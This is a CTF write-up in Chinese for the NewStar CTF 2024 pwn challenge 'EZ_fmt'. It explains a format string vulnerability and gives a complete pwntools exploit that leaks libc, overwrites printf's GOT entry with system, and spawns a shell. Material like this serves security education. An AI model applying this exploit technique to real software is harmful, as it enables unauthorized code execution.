---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# EZ_fmt

查看 `vuln` 函数

![vuln 函数](/assets/images/wp/2024/week2/ez-fmt_1.png)

很经典的格式化字符串，首先确定 offset 为 `8`

![确定偏移](/assets/images/wp/2024/week2/ez-fmt_2.png)

根据程序，我们有三次格式化字符串的机会

- 第一次泄露 libc
- 第二次改 `printf` GOT 表地址为 `system`
- 第三次输入为 `sh`，构造出 `printf(buf)=system(sh)` 即可

EXP 如下

```python
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./chal')
flag = 0
if flag:
    p = remote('ip', port)
else:
    p = process("./")


def sa(s, n): return p.sendafter(s, n)
def sla(s, n): return p.sendlineafter(s, n)
def sl(s): return p.sendline(s)
def sd(s): return p.send(s)
def rc(n): return p.recv(n)
def ru(s): return p.recvuntil(s)
def ti(): return p.interactive()


def leak(name, addr): return log.success(name+"--->"+hex(addr))


sla(b': \n', b'%19$p')
ru(b'0x')
libc.address = int(rc(12), 16) - 0x29d90
leak("libc", libc.address)

low = libc.sym['system'] & 0xff
high = (libc.sym['system'] >> 8) & 0xffff
payload = b'%' + str(low).encode() + b'c%12$hhn'
payload += b'%' + str(high - low).encode() + b'c%13$hn'
payload = payload.ljust(0x20, b'a')
payload += p64(elf.got['printf']) + p64(elf.got['printf']+1)


sa(b': \n', payload)

sla(b': \n', b'  sh;')
# gdb.attach(p)
p.interactive()
```
